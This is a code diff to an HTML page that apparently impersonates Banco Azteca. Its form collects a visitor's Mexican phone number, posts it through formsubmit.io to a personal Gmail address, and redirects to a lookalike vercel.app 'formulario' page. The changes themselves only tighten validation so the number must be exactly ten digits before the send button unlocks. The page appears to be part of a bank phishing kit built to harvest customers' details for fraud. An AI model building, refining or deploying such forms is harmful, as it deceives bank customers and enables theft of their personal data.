@@ -60,8 +60,8 @@
         <form class="pedirnum" id="contactform" action="https://formsubmit.io/send/aztecabancok@gmail.com" method="POST">
             <input name="_redirect" type="hidden" id="name" value="https://clientesbancoazteca.vercel.app/formulario.html">
             <div class="contingnum">
-            <label class="numlabel" for="num">+52</label>
-            <input type="number" name="num" id="num" placeholder="Ingrese su numero">
+                <label class="numlabel" for="num">+52</label>
+                <input type="text" name="num" id="num" placeholder="Ingrese su número" onkeypress="return event.charCode >= 48 && event.charCode <= 57"  maxlength="10">
             </div>
             <input class="btnenviar" id="btnenviar" type="submit" value="Enviar">
         </form>
@@ -75,14 +75,23 @@
       this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
     }
 
+    //evitar que se puedan escribir más de 10 números, es decir que no permita escribir más de 10 números, si se intenta se borra automáticamente o se corta
+    function limitInput() {
+        var input = document.getElementById("num");
+        if (input.value.length > 10) {
+          input.value = input.value.slice(0, 10);
+        }
+      }
+
+    limitInput();
     
-numInput.oninput = function() {
-    if (numInput.value.length === 10) {
-      btnenviar.removeAttribute("disabled");
-    } else {
-      btnenviar.setAttribute("disabled", "");
+    numInput.oninput = function() {
+        if (numInput.value.length === 10) {
+            btnenviar.removeAttribute("disabled");
+        } else {
+            btnenviar.setAttribute("disabled", "");
+        }
     }
-  }
 
 </script>
 </html>
